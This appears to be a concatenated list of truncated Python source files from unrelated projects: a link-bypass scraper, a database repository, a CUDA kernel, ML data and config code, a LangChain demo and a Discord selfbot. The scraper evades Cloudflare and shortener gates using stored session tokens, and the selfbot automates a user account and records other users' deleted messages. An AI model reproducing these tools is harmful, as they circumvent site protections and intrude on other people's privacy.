    "import re\r\nimport requests\r\nfrom curl_cffi import requests as Nreq\r\nimport base64\r\nfrom urllib.parse import unquote, urlparse, quote\r\nimport time\r\nimport cloudscraper\r\nfrom bs4 import BeautifulSoup, NavigableString, Tag\r\nfrom lxml import etree\r\nimport hashlib\r\nimport json\r\nfrom asyncio import sleep as asleep\r\nimport ddl\r\nfrom cfscrape import create_scraper\r\nfrom json import load\r\nfrom os import environ\r\n\r\nwith open('config.json', 'r') as f: DATA = load(f)\r\ndef getenv(var): return environ.get(var) or DATA.get(var, None)\r\n\r\n\r\n##########################################################\r\n# ENVs\r\n\r\nGDTot_Crypt = getenv(\"CRYPT\")\r\nLaravel_Session = getenv(\"Laravel_Session\")\r\nXSRF_TOKEN = getenv(\"XSRF_TOKEN\")\r\nDCRYPT = getenv(\"DRIVEFIRE_CRYPT\")\r\nKCRYPT = getenv(\"KOLOP_CRYPT\")\r\nHCRYPT = getenv(\"HUBDRIVE_CRYPT\")\r\nKATCRYPT = getenv(\"KATDRIVE_CRYPT\")\r\nCF = getenv(\"CLOUDFLARE\")\r\n\r\n############################################################\r\n# Lists\r\n\r\notherslist = [\"exe.io\",\"exey.io\",\"sub2unlock.net\",\"sub2unlock.com\",\"rekonise.com\",\"letsboost.net\",\"ph.apps2app.com\",\"mboost.me\",\r\n\"sub4unlock.com\",\"ytsubme.com\",\"social-unlock.com\",\"boost.ink\",\"goo.gl\",\"shrto.ml\",\"t.co\"]\r\n\r\ngdlist = [\"appdrive\",\"driveapp\",\"drivehub\",\"gdflix\",\"drivesharer\",\"drivebit\",\"drivelinks\",\"driveace\",\r\n\"drivepro\",\"driveseed\"]\r\n\r\n\r\n###############################################################\r\n# pdisk\r\n\r\ndef pdisk(url):\r\n    r = requests.get(url).text\r\n    try: return r.split(\"<!-- \")[-1].split(\" -->\")[0]\r\n    except:\r\n        try:return BeautifulSoup(r,\"html.parser\").find('video').find(\"source\").get(\"src\")\r\n        except: return None\r\n\r\n###############################################################\r\n# index scrapper\r\n\r\ndef scrapeIndex(url, username=\"none\", password=\"none\"):\r\n\r\n    def authorization_token(username, password):\r\n        user_pass = f\"{username}:{password}\"\r\n        return f\"Basic {base64.b64encode(user_pass.encode()).decode()}\"\r\n\r\n          \r\n    def decrypt(string): \r\n        return base64.b64decode(string[::-1][24:-20]).decode('utf-8')  \r\n\r\n    \r\n    def func(payload_input, url, username, password): \r\n        next_page = False\r\n        next_page_token = \"\" \r\n\r\n        url = f\"{url}/\" if url[-1] != '/' else url\r\n\r\n        try: headers = {\"authorization\":authorization_token(username,password)}\r\n        except: return \"username/password combination is wrong\", None, None\r\n\r\n        encrypted_response = requests.post(url, data=payload_input, headers=headers)\r\n        if encrypted_response.status_code == 401: return \"username/password combination is wrong\", None, None\r\n\r\n        try: decrypted_response = json.loads(decrypt(encrypted_response.text))\r\n        except: return \"something went wrong. check index link/username/password field again\", None, None\r\n\r\n        page_token = decrypted_response[\"nextPageToken\"]\r\n        if page_token is None: \r\n            next_page = False\r\n        else: \r\n            next_page = True \r\n            next_page_token = page_token \r\n\r\n\r\n        if list(decrypted_response.get(\"data\").keys())[0] != \"error\":\r\n            file_length = len(decrypted_response[\"data\"][\"files\"])\r\n            result = \"\"\r\n\r\n            for i, _ in enumerate(range(file_length)):\r\n                files_type   = decrypted_response[\"data\"][\"files\"][i][\"mimeType\"]\r\n                if files_type != \"application/vnd.google-apps.folder\":\r\n                        files_name   = decrypted_response[\"data\"][\"files\"][i][\"name\"] \r\n\r\n                        direct_download_link = url + quote(files_name)\r\n                        result += f\"\u2022 {files_name} :\\n{direct_download_link}\\n\\n\"\r\n            return result, next_page, next_page_token\r\n\r\n    def format(result):\r\n        long_string = ''.join(result)\r\n        new_list = []\r\n\r\n        while len(long_string) > 0:\r\n            if len(long_string) > 4000:\r\n                split_index = long_string.rfind(\"\\n\\n\", 0, 4000)\r\n                if split_index == -1:\r\n                    split_index = 4000\r\n            else:\r\n                split_index = len(long_string)\r\n                \r\n            new_list.append(long_string[:split_index])\r\n            long_string = long_string[split_index:].lstrip(\"\\n\\n\")\r\n        \r\n        return new_list\r\n\r\n    # main\r\n    x = 0\r\n    next_page = False\r\n    next_page_token = \"\" \r\n    result = []\r\n\r\n    payload = {\"page_token\":next_page_token, \"page_index\": x}\t\r\n    print(f\"Index Link: {url}\\n\")\r\n    temp, next_page, next_page_token = func(payload, url, username, password)\r\n    if temp is not None: result.append(temp)\r\n    \r\n    while next_page == True:\r\n        payload = {\"page_token\":next_page_token, \"page_index\": x}\r\n        temp, next_page, next_page_token = func(payload, url, username, password)\r\n        if temp is not None: result.append(temp)\r\n        x += 1\r\n        \r\n    if len(result)==0: return None\r\n    return format(result)\r\n\r\n################################################################\r\n# Shortner Full Page API\r\n\r\ndef shortner_fpage_api(link):\r\n  ",
    "from typing import Dict, List\nfrom src.models.settings.connection import db_connection_handler\nfrom src.models.entities.attendees import Attendees\nfrom src.models.entities.check_ins import CheckIns\nfrom src.models.entities.events import Events\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlalchemy.orm.exc import NoResultFound\nfrom src.errors.error_types.http_conflict import HttpConflictError\n\nclass AttendeesRepository:\n    def insert_attendee(self, attendde_info: Dict) -> Dict:\n        with db_connection_handler as database:\n            try:\n                attendee = (\n                    Attendees(\n                        id=attendde_info.get(\"uuid\"),\n                        name=attendde_info.get(\"name\"),\n                        email=attendde_info.get(\"email\"),\n                        event_id=attendde_info.get(\"event_id\")\n                    )\n                )\n                database.session.add(attendee)\n                database.session.commit()\n\n                return attendde_info\n            except IntegrityError:\n                raise HttpConflictError('Participante ja cadastrado!')\n            except Exception as exception:\n                database.session.rollback()\n                raise exception\n\n    def get_attendee_badge_by_id(self, attendee_id: str):\n        with db_connection_handler as database:\n            try:\n                attendee = (\n                    database.session\n                        .query(Attendees)\n                        .join(Events, Events.id == Attendees.event_id)\n                        .filter(Attendees.id==attendee_id)\n                        .with_entities(\n                            Attendees.name,\n                            Attendees.email,\n                            Events.title\n                        )\n                        .one()\n                )\n                return attendee\n            except NoResultFound:\n                return None\n\n    def get_attendees_by_event_id(self, event_id: str) -> List[Attendees]:\n        with db_connection_handler as database:\n            attendees = (\n                database.session\n                    .query(Attendees)\n                    .outerjoin(CheckIns, CheckIns.attendeeId==Attendees.id)\n                    .filter(Attendees.event_id==event_id)\n                    .with_entities(\n                        Attendees.id,\n                        Attendees.name,\n                        Attendees.email,\n                        CheckIns.created_at.label('checkedInAt'),\n                        Attendees.created_at.label('createdAt')\n                    )\n                    .all()\n            )\n            return attendees",
    "import ctypes\nimport functools\n\nfrom ....core.cache import cached\n\nfrom ....compiler.template import substitude\nfrom ....compiler.cxx import CXXUnit, import_symbol\nfrom ...compiler import nvcc\n\n@cached()\ndef generate_index_kernel(name: str, dtype: str):\n    kernel_name = f\"minit_{name}\"\n    kernel_template =\\\n\"\"\"\n#include <cuda.h>\n#include <cuda_fp16.h>\n#include <cuda_runtime.h>\n#include <algorithm>\n#include <cuda/std/array>\n#include <cstring>\n#include <cstdio>\n#include <stdexcept>\n\n\n#define CUDA_ASSERT(expr)                                           \\\\\n    do {                                                            \\\\\n        auto _err = (expr);                                         \\\\\n        if (_err != cudaSuccess) {                                  \\\\\n            throw std::runtime_error(cudaGetErrorString(_err));     \\\\\n        }                                                           \\\\\n    } while (0)\n\nusing T = ${DATA_TYPE};\n\ntemplate <size_t nr_ranks>\nstruct TensorIterator {\n    size_t shape[nr_ranks];\n\n    __device__ cuda::std::array<size_t, nr_ranks> to_index(size_t offset) const {\n        cuda::std::array<size_t, nr_ranks> index;\n        for (size_t i = 0; i < nr_ranks; ++i) {\n            index[nr_ranks-i-1] = offset % shape[nr_ranks-i-1];\n            offset /= shape[nr_ranks-i-1];\n        }\n        return index;\n    }\n\n    __device__ size_t to_offset(cuda::std::array<size_t, nr_ranks> index) const {\n        size_t offset = 0;\n        for (size_t i = 0; i < nr_ranks; ++i) {\n            offset *= shape[i];\n            offset += index[i];\n        }\n        return offset;\n    }\n};\n\n__global__ void kernel(T* input, std::int32_t* index, T* output, size_t a, size_t b, size_t c, size_t d) {\n    size_t nr_elements = a * c * d;\n    size_t stride = blockDim.x * gridDim.x;\n    TensorIterator<3> output_iterator;\n    output_iterator.shape[0] = a;\n    output_iterator.shape[1] = c;\n    output_iterator.shape[2] = d;\n    TensorIterator<3> input_iterator;\n    input_iterator.shape[0] = a;\n    input_iterator.shape[1] = b;\n    input_iterator.shape[2] = d;\n    for (size_t offset = blockIdx.x * blockDim.x + threadIdx.x; offset < nr_elements; offset += stride) {\n        auto output_offset = offset;\n        auto output_index = output_iterator.to_index(output_offset);\n        if (index[output_index[1]] < 0) {\n            __trap();\n        }\n        if (index[output_index[1]] >= b) {\n            __trap();\n        }\n        auto input_offset = input_iterator.to_offset({output_index[0], index[output_index[1]], output_index[2]});\n        output[offset] = input[input_offset];\n    }\n}\n\nextern \"C\" void ${KERNEL_NAME}(cudaStream_t stream, T* input, std::int32_t* index, T* output, size_t a, size_t b, size_t c, size_t d) {\n    size_t nr_elements = a * c * d;\n    if (nr_elements == 0) {\n        return;\n    }\n    static constexpr size_t nr_sms = 108;\n    size_t nr_threads_per_block = std::min((size_t)1024, (size_t)((nr_elements + nr_sms - 1) / nr_sms));\n    size_t nr_blocks = (nr_elements + nr_threads_per_block - 1) / nr_threads_per_block;\n    kernel<<<nr_blocks, nr_threads_per_block, 0, stream>>>(input, index, output, a, b, c, d);\n    CUDA_ASSERT(cudaGetLastError());\n}\n\"\"\"\n    source = substitude(kernel_template, {\n        \"DATA_TYPE\": dtype,\n        \"KERNEL_NAME\": kernel_name,\n    })\n    kernel = nvcc.compile(CXXUnit(source=source))\n    @import_symbol(kernel, kernel_name)\n    def entrance(\n        stream: ctypes.c_void_p,\n        input: ctypes.c_void_p,\n        index: ctypes.c_void_p,\n        output: ctypes.c_void_p,\n        a: ctypes.c_size_t,\n        b: ctypes.c_size_t,\n        c: ctypes.c_size_t,\n        d: ctypes.c_size_t,\n    ):\n        ...\n    return entrance\n",
    "import torch\r\nfrom torch.utils.data import Dataset, DataLoader\r\nfrom pytorch_lightning import LightningModule\r\nfrom pytorch_lightning.trainer.supporters import CombinedLoader\r\nimport os, sys, random\r\n\r\nclass DPODataset(Dataset):\r\n    def __init__(self, args):\r\n        self.args = args\r\n        # TODO: to args.dpo_train_file\r\n        self.data = torch.load(args.rlhf_train_file)\r\n        # TODO: to \r\n        self.precision = {\r\n            \"bf16\": torch.bfloat16,\r\n            \"fp32\": torch.float32,\r\n            \"fp16\": torch.float16,\r\n        }[args.precision]\r\n        # self.precision = torch.bfloat16\r\n        # self.data1, self.data2 = data\r\n\r\n    def __len__(self):\r\n        # return len(self.data)\r\n        return self.args.epoch_steps * self.args.micro_bsz\r\n        # return len(self.data1)\r\n\r\n    def __getitem__(self, idx):\r\n        idx = random.randrange(len(self.data))\r\n        prompt_tokens, chosen_tokens, reject_tokens, chosen_base_prob, reject_base_prob = self.data[idx]\r\n        if len(prompt_tokens) > self.args.rlhf_max_corpus_len:\r\n            prompt_tokens = prompt_tokens[:self.args.rlhf_max_corpus_len]\r\n\r\n        if len(chosen_tokens) > self.args.rlhf_max_corpus_len:\r\n            chosen_tokens = chosen_tokens[:self.args.rlhf_max_corpus_len]\r\n            \r\n\r\n        if len(reject_tokens) > self.args.rlhf_max_corpus_len:\r\n            reject_tokens = reject_tokens[:self.args.rlhf_max_corpus_len]\r\n            \r\n        #print(f'prompt tokens {len(prompt_tokens) }')\r\n        #print(f'chosen_tokens {len(chosen_tokens) }')\r\n        #print(f'reject_tokens {len(reject_tokens) }')\r\n        \r\n        return (\r\n            # chosen_input, chosen_output\r\n            torch.tensor(prompt_tokens + chosen_tokens[:-1], dtype=torch.long).unsqueeze(0),\r\n            torch.tensor(prompt_tokens[1:] + chosen_tokens, dtype=torch.long),\r\n            len(chosen_tokens),\r\n            chosen_base_prob,\r\n            # torch.tensor([0] * (len(prompt_tokens)-1) + [1] * len(chosen_tokens), dtype=self.precision),\r\n            # reject_input, reject_output\r\n            torch.tensor(prompt_tokens + reject_tokens[:-1], dtype=torch.long).unsqueeze(0),\r\n            torch.tensor(prompt_tokens[1:] + reject_tokens, dtype=torch.long),\r\n            len(reject_tokens),\r\n            reject_base_prob,\r\n            # torch.tensor([0] * (len(prompt_tokens)-1) + [1] * len(reject_tokens), dtype=self.precision),\r\n        )\r\n        \r\n# dpo_dataset = DPODataset(\"validset.save\")\r\n# data_loader = DataLoader(dpo_dataset, batch_size=2, shuffle=True, collate_fn=lambda x:x)\r\n\r\n# for batch in data_loader:\r\n#     print(batch)\r\n\r\n# class CustomDataset(Dataset):\r\n#     def __init__(self, data):\r\n#         self.data1, self.data2 = data\r\n\r\n#     def __len__(self):\r\n#         return len(self.data1)\r\n\r\n#     def __getitem__(self, idx):\r\n#         return self.data1[idx], self.data2[idx]\r\n\r\n# my_data = [[torch.randn(5) for _ in range(20)], [torch.randn(1) for _ in range(20)]]\r\n# custom_dataset_1 = CustomDataset(my_data)\r\n# data_loader_1 = DataLoader(custom_dataset_1, batch_size=4, shuffle=True, collate_fn= lambda x: x)\r\n\r\n# my_data2 = [[torch.randn(4) for _ in range(20)], [torch.randn(1) for _ in range(20)]]\r\n# custom_dataset_2 = CustomDataset(my_data2)\r\n# data_loader_2 = DataLoader(custom_dataset_2, batch_size=3, shuffle=True)\r\n\r\n# loaders = CombinedLoader([data_loader_1, data_loader_2], \"max_size_cycle\")\r\n\r\n# for batch in loaders:\r\n#     print(batch)\r\n\r\n\r\n\r\n",
    "import os\n\nfrom Tool.Respond_Agent_Section_Tool import FinalResponse_SectionAgent\n\n\ndef extract_result(text):\n    \"\"\"A function to extract output when Claude occasionally fails to use the provided tools for structured output.\n    Args:\n       text: The final response from the agent\n    Returns:\n       The extracted result for each tag\n    \"\"\"\n    pattern_result = r'<result>(.*?)<\\/result>'\n    pattern_section_complete = r'<section_complete>(.*?)<\\/section_complete>'\n    pattern_section_title = r'<section_title>(.*?)<\\/section_title>'\n    pattern_section_content = r'<section_content>(.*?)<\\/section_content>'\n    pattern_section_thought = r'<section_thought>(.*?)<\\/section_thought>'\n    import re\n    match_result = re.search(pattern_result, text, re.DOTALL)\n    match_section_title = re.search(pattern_section_title, text, re.DOTALL)\n    match_section_content = re.search(pattern_section_content, text, re.DOTALL)\n    match_section_thought = re.search(pattern_section_thought, text, re.DOTALL)\n    match_section_complete = re.search(pattern_section_complete, text, re.DOTALL)\n    if match_result:\n        if match_section_title and match_section_content and match_section_thought:\n            return {\n                \"section_title\": match_section_title.group(1).strip(),\n                \"section_content\": match_section_content.group(1).strip(),\n                \"section_thought\": match_section_thought.group(1).strip()\n            }\n        else:\n            return match_result.group(1).strip()\n    elif match_section_complete:\n        if match_section_title and match_section_content and match_section_thought:\n            return {\n                \"section_title\": match_section_title.group(1).strip(),\n                \"section_content\": match_section_content.group(1).strip(),\n                \"section_thought\": match_section_thought.group(1).strip()\n            }\n        else:\n            return match_section_complete.group(1).strip()\n    elif match_section_title and match_section_content and match_section_thought:\n        return {\n            \"section_title\": match_section_title.group(1).strip(),\n            \"section_content\": match_section_content.group(1).strip(),\n            \"section_thought\": match_section_thought.group(1).strip()\n        }\n    else:\n        return None\n\n\ndef parse_result_to_document_format(document: dict | FinalResponse_SectionAgent | str) -> str:\n    \"\"\"Returns the agent's response in different document formats based on the response type (dict, str, FinalResponse_SectionAgent)\n    Args:\n        document: The response generated by the agent, which can be one of dict, str, or FinalResponse_SectionAgent\n    Return:\n        If the document type is dict or FinalResponse_SectionAgent, extracts and returns as str\n        If the document type is str, returns as is\n    \"\"\"\n    if isinstance(document, FinalResponse_SectionAgent):\n        return f\"{document.section_title}\\n\\n{document.section_content}\\n\\n\\n####Researcher Opinion\\n\\n{document.section_thought}\\n\\n\\n\\n\"\n    elif isinstance(document, dict):\n        section_title = document.get(\"section_title\")\n        section_content = document.get(\"section_content\")\n        section_thought = document.get(\"section_thought\")\n        return f\"{section_title}\\n\\n{section_content}\\n\\n\\n####Researcher Opinion\\n\\n{section_thought}\\n\\n\\n\\n\"\n    else:\n        return f\"\\n\\n{document}\"\n\n\ndef setup_new_document_format(document_title: str, document_description: str, original_question: str) -> str:\n    \"\"\"Process to set the document title for creating an MD file\"\"\"\n    return f\"# {document_title}\\n\\n## {original_question}\\n\\n{document_description}\\n\\n\\n\"\n\n\ndef save_document_to_md(full_document: str, document_title: str):\n    \"\"\"After confirming with the user whether to save the file, creates a markdown file with the document_title as the filename inside the src folder\n    Args:\n        full_document: The combined value of each agent's results generated through the parse_result_to_document_format function\n        document_title: The document title generated by the LLM in the O stage of THLO\n    Returns:\n        None\n    \"\"\"\n    print(\"#####DOCUMENT#####\\n\\n\")\n    print(full_document)\n    print(\"#####DOCUMENT#####\\n\\n\")\n\n    user_response = input('[y/n] Would you want to save this document as a .md file?: ')\n    if user_response.lower() == 'y':\n        # create file name\n        file_name = f\"{document_title}.md\"\n\n        parent_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))\n\n        file_path = os.path.join(parent_dir, \"src\", file_name)\n\n        with open(file_path, \"w\", encoding=\"utf-8\") as file:\n            file.write(full_document)\n\n        print(f\"DOCUMENT SAVED AS {file_name} SUCCESSFULLY\")\n    else:\n        print(\"DOCUMENT NOT SAVED.\")",
    "# Copyright 2024 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom typing import Tuple, Dict\n\nimport dataclasses\nimport yaml\n\nimport jax\nimport jax.sharding as jsharding\nfrom jax.experimental import mesh_utils\nimport torch_xla2\n\n\nfrom jetstream_pt import cache_manager\n\n\n@dataclasses.dataclass\n# pylint: disable-next=all\nclass QuantizationConfig:\n  enable_weight_quantization: bool = False\n  num_bits_weight: int = 8\n  is_blockwise_weight: bool = False\n\n  enable_kv_quantization: bool = False\n\n\n@dataclasses.dataclass\n# pylint: disable-next=all\nclass JetEngineEnvironmentData:\n  checkpoint_path: str = \"\"  # if empty string then use model's state_dict()\n  checkpoint_format: str = \"safetensors\"  # torch, safetensors\n\n  tokenizer_path: str = \"\"\n\n  max_input_sequence_length: int = 1024\n  max_decode_length: int = 1024\n  batch_size: int = 32  # batch size is generate step batch size\n  cache_sequence_length: int = 2048  # size of the cache.\n\n  quant_config: QuantizationConfig = QuantizationConfig()\n\n  model_type: str = \"llama-2-13b\"  # this implies the model config\n\n  # Names of the axis of the tensors for QKV in Attention.\n  # This is also the dimensions of KV cache\n  attention_kv_axis_names: Tuple[str, ...] = (\n      \"batch\",\n      \"num_attn_heads\",\n      \"sequence_length\",\n      \"head_dim\",\n  )\n\n  # Shape of cache len(cache_shape) == len(attention_kv_axis_names)\n  cache_shape: Tuple[int, ...] = ()\n\n  num_layers: int = 0\n\n  # This is the axis to shard among the number of available devices\n  # This string must be one of the values of attention_kv_axis_names above\n  kv_cache_shard_axis: str = \"num_attn_heads\"\n\n  # Override sharding axis of a weight by name\n  experimental_sharding_axis_override: Dict[str, int] = dataclasses.field(\n      default_factory=dict\n  )\n\n  # QKV fusion has negative performance on TPU, slicing takes longer\n  qkv_fusion: bool = False\n\n  # If Ture, use bfloat16 as dtype. If False, use float32 as dtype\n  bf16_enable: bool = True\n\n  sharding_config_path: str = \"\"\n\n  # Whether to shard on batch dimension. i.e. data parallel.\n  shard_on_batch: bool = False\n\n\n# pylint: disable-next=all\nclass JetEngineEnvironment:\n\n  def __init__(self, data: JetEngineEnvironmentData):\n    self._data = data\n\n    self.seq_len = self._data.max_input_sequence_length\n\n    P = jax.sharding.PartitionSpec\n\n    num_of_partitions = jax.device_count()\n    # make mesh etc.\n    self._mesh = jsharding.Mesh(\n        mesh_utils.create_device_mesh((num_of_partitions, 1)),\n        axis_names=(\"x\", \"y\"),\n    )\n\n    self.y_sharding = jsharding.NamedSharding(self._mesh, P(None, \"x\"))\n    self.x_sharding = jsharding.NamedSharding(self._mesh, P(\"x\"))\n    self.replicated = jsharding.NamedSharding(self._mesh, P())\n\n    if data.shard_on_batch:\n      cache_sharding_axis = 0\n    else:\n      cache_sharding_axis = self.attention_kv_axis_names.index(\n          self.kv_cache_shard_axis\n      )\n\n    if self.cache_shape[cache_sharding_axis] == 1:\n      # cannot shard on an axis that is 1\n      # default to last\n      cache_sharding_axis = len(self.cache_shape) - 1\n\n    self.cache_sharding = self.sharding_by_axis(cache_sharding_axis)\n    self._load_sharding_config()\n\n  def _load_sharding_config(self):\n    \"\"\"Load sharding config\"\"\"\n    if self._data.sharding_config_path:\n      with open(self._data.sharding_config_path, encoding=\"utf-8\") as f:\n        self._sharding_config = yaml.safe_load(f)\n    else:\n      self._sharding_config = {}\n\n  def __getattr__(self, name):\n    return getattr(self._data, name)\n\n  # This is used by model to add activation sharding.\n  def apply_sharding(self, tensor, *, axis: int | None):\n    \"\"\"Apply sharding for tensor\"\"\"\n    if not isinstance(tensor, torch_xla2.tensor.XLATensor2):\n      return\n    sharding_spec = self.sharding_by_axis(axis)\n    # pylint: disable-next=all\n    tensor._elem = jax.lax.with_sharding_constraint(tensor._elem, sharding_spec)\n\n  def sharding_by_axis(self, axis):\n    \"\"\"return sharding partition spc by axis, options are x, y, -1 or Noe\"\"\"\n    if axis == -1 or axis is None:\n      return jsharding.NamedSharding(self._mesh, jax.sharding.PartitionSpec())\n    sharding = [None] * (axis + 1)\n    sharding[axis] = \"x\"\n    sharding_spec = jsharding.NamedSharding(\n        self._mesh, jax.sharding.PartitionSpec(*sharding)\n    )\n    return sharding_spec\n\n  def make_caches_prefill(self):\n    \"\"\"Create kv caches for inference prefill\"\"\"\n    caches = []\n    for _ in range(self.num_layers):\n      caches.append(cache_manag",
    "from fastapi import FastAPI\nfrom fastapi.responses import StreamingResponse, FileResponse\nfrom langchain_openai import ChatOpenAI\nfrom dotenv import load_dotenv\nfrom langchain.schema import Document\nfrom langchain_openai import OpenAIEmbeddings\nfrom langchain_community.vectorstores.chroma import Chroma\nfrom langchain_core.runnables import RunnablePassthrough\nfrom langchain_core.prompts import ChatPromptTemplate\nfrom langchain_core.output_parsers import StrOutputParser\nfrom langchain_core.messages import AIMessageChunk\n\n\nload_dotenv()\n\nembedding_function = OpenAIEmbeddings()\n\ndocs = [\n    Document(\n        page_content=\"the dog loves to eat pizza\", metadata={\"source\": \"animal.txt\"}\n    ),\n    Document(\n        page_content=\"the cat loves to eat lasagna\", metadata={\"source\": \"animal.txt\"}\n    ),\n]\n\ndb = Chroma.from_documents(docs, embedding_function)\nretriever = db.as_retriever()\n\n\ntemplate = \"\"\"Answer the question based only on the following context:\n{context}\n\nQuestion: {question}\n\"\"\"\nprompt = ChatPromptTemplate.from_template(template)\nmodel = ChatOpenAI(temperature=0, streaming=True)\n\nretrieval_chain = (\n    {\"context\": retriever, \"question\": RunnablePassthrough()}\n    | prompt\n    | model\n    | StrOutputParser()\n)\n\napp = FastAPI()\n\n\n@app.get(\"/\")\nasync def root():\n    return FileResponse(\"static/index.html\")\n\n\ndef serialize_aimessagechunk(chunk):\n    \"\"\"\n    Custom serializer for AIMessageChunk objects.\n    Convert the AIMessageChunk object to a serializable format.\n    \"\"\"\n    if isinstance(chunk, AIMessageChunk):\n        return chunk.content\n    else:\n        raise TypeError(\n            f\"Object of type {type(chunk).__name__} is not correctly formatted for serialization\"\n        )\n\nasync def generate_chat_events(message):\n    async for event in model.astream_events(message, version=\"v1\"):\n        if event[\"event\"] == \"on_chat_model_stream\":\n            chunk_content = serialize_aimessagechunk(event[\"data\"][\"chunk\"])\n            chunk_content_html = chunk_content.replace(\"\\n\", \"<br>\")\n            yield f\"data: {chunk_content_html}\\n\\n\"\n        elif event[\"event\"] == \"on_chat_model_end\":\n            print(\"Chat model has completed its response.\")\n\n\n@app.get(\"/chat_stream/{message}\")\nasync def chat_stream_events(message: str):\n    return StreamingResponse(generate_chat_events(message), media_type=\"text/event-stream\")\n\n\nif __name__ == \"__main__\":\n    import uvicorn\n\n    uvicorn.run(app, host=\"0.0.0.0\", port=8000)\n",
    "import discord\r\nfrom discord.ext import commands\r\nimport asyncio\r\nimport random\r\nimport time\r\n\r\nimport config_selfbot\r\nimport langs\r\n\r\ndef random_cooldown(minimum, maximum):\r\n    cooldown = random.randint(minimum*100000,maximum*100000) / 100000\r\n    return cooldown\r\n\r\nclass UtilsCommands(commands.Cog):\r\n    def __init__(self, bot):\r\n        self.bot: commands.Bot = bot\r\n        self.sniped_messages: dict = {}\r\n\r\n    @commands.Cog.listener()\r\n    async def on_message_delete(self, message):\r\n        if not message.author.id == self.bot.user.id:\r\n            try:\r\n                attachments_urls = [attachment.url for attachment in message.attachments]\r\n                self.sniped_messages[message.channel.id] = {\r\n                    'author': message.author,\r\n                    'content': message.content,\r\n                    'images': attachments_urls if message.attachments else None,\r\n                    'time': round(time.time())\r\n                }\r\n            except Exception:\r\n                return\r\n\r\n    @commands.command()\r\n    async def snipe(self, ctx):\r\n        sniped_message = self.sniped_messages.get(ctx.channel.id)\r\n        if sniped_message:\r\n            images_text = \", \".join(sniped_message['images']) if not sniped_message['images'] is None else langs.empty[config_selfbot.lang]\r\n            await ctx.message.edit(f\"\"\"__**\ud83d\udd2b Sniper:**__\r\n\r\n\ud83d\udde3\ufe0f {langs.author[config_selfbot.lang]}: {sniped_message['author']}\r\n\ud83d\udce9 Message:\r\n```txt\r\n{sniped_message['content']}\r\n```\r\n\ud83d\uddbc\ufe0f Images: {images_text}\r\n\u231a {langs.time_snipe[config_selfbot.lang]}: <t:{sniped_message['time']}:R>\"\"\")\r\n            await asyncio.sleep(config_selfbot.deltime)\r\n            await ctx.message.delete()\r\n        else:\r\n            await ctx.message.edit(langs.error_no_message_snipe[config_selfbot.lang])\r\n            await asyncio.sleep(config_selfbot.deltime)\r\n            await ctx.message.delete()\r\n\r\n    @commands.command()\r\n    async def clear(self, ctx):\r\n        message_split = ctx.message.content.split()\r\n        try:\r\n            str_amount = message_split[1]\r\n        except Exception:\r\n            str_amount = \"19\"\r\n\r\n        try:\r\n            amount = int(str_amount) + 1\r\n        except Exception:\r\n            await ctx.message.edit(langs.spam_invalid[config_selfbot.lang])\r\n            await asyncio.sleep(config_selfbot.deltime)\r\n            await ctx.message.delete()\r\n            return\r\n        \r\n        async for message in ctx.channel.history(limit=amount):\r\n            if message.author.id == self.bot.user.id:\r\n                await message.delete()\r\n                await asyncio.sleep(random_cooldown(0.4, 1))\r\n        \"\"\"\r\n        This can hardly rate limit you because user don't have access to bulk-message-delete endpoint.\r\n        \r\n        else:\r\n            def is_me(m):\r\n                return m.author.id == self.bot.user.id\r\n            await ctx.channel.purge(limit=amount, check=is_me)\r\n        \"\"\"\r\n\r\n        await ctx.channel.send(f\"> \ud83c\udf0c **{config_selfbot.selfbot_name}**\", delete_after=1.4)\r\n\r\n    @commands.command()\r\n    async def hype(self, ctx):\r\n        house = ctx.message.content.split()[1]\r\n        if house == \"balance\":\r\n            await self.bot.user.edit(house=discord.HypeSquadHouse.balance)\r\n            await ctx.message.edit(f\"\ud83e\ude84 HypeSquad {langs.hype_command[config_selfbot.lang]} ``{house}``\")\r\n            await asyncio.sleep(config_selfbot.deltime)\r\n            await ctx.message.delete()\r\n        elif house == \"bravery\":\r\n            await self.bot.user.edit(house=discord.HypeSquadHouse.bravery)\r\n            await ctx.message.edit(f\"\ud83e\ude84 HypeSquad {langs.hype_command[config_selfbot.lang]} ``{house}``\")\r\n            await asyncio.sleep(config_selfbot.deltime)\r\n            await ctx.message.delete()\r\n        elif house == \"brilliance\":\r\n            await self.bot.user.edit(house=discord.HypeSquadHouse.brilliance)\r\n            await ctx.message.edit(f\"\ud83e\ude84 HypeSquad {langs.hype_command[config_selfbot.lang]} ``{house}``\")\r\n            await asyncio.sleep(config_selfbot.deltime)\r\n            await ctx.message.delete()\r\n        else:\r\n            await ctx.message.edit(langs.hype_fail[config_selfbot.lang])\r\n            await asyncio.sleep(config_selfbot.deltime)\r\n            await ctx.message.delete()\r\n\r\n    @commands.command()\r\n    async def ping(self, ctx):\r\n        await ctx.message.edit(f\"\ud83c\udfd3 Pong ! (Ping: **{round(self.bot.latency * 1000)}ms**)\")\r\n        await asyncio.sleep(config_selfbot.deltime)\r\n        await ctx.message.delete()\r\n\r\n    @commands.command()\r\n    async def bio(self, ctx):\r\n        message_split = ctx.message.content.split()\r\n        new_bio = ctx.message.content.replace(f\"{message_split[0]} \", \"\")\r\n        await self.bot.user.edit(bio=new_bio)\r\n        await ctx.message.edit(f\"\ud83d\udcd6 Bio {langs.bio_command[config_selfbot.lang]} \\\"`{new_bio}`\\\"\")\r\n        await asyncio.sleep(config_selfbot.deltime)\r\n        await ctx.message.delete()\r\n\r\n    @commands.command()\r\n    async def userinfo(self, ctx):\r\n     ",
